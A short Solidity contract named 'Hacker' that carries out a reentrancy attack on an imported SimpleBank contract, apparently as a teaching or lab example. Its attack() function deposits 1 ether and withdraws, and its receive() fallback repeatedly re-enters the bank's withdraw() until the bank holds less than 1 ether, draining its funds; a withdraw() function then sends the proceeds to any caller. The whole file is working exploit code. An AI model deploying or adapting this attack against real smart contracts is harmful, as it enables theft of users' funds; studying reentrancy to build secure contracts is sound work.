// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./SimpleBank.sol";


contract Hacker {
    
    SimpleBank public simpleBank;


    constructor(address _simpleBankAdrress) {
        simpleBank = SimpleBank(_simpleBankAdrress);
    }

    receive() external payable {
        if (address(simpleBank).balance >= 1 ether) {
            simpleBank.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        simpleBank.deposit{value: 1 ether}();
        simpleBank.withdraw();
    }

    
    function withdraw() public  {
        
        (bool sent,) = msg.sender.call{value: address(this).balance}("");

        require(sent, "Failed to send Ether");
        
    }

}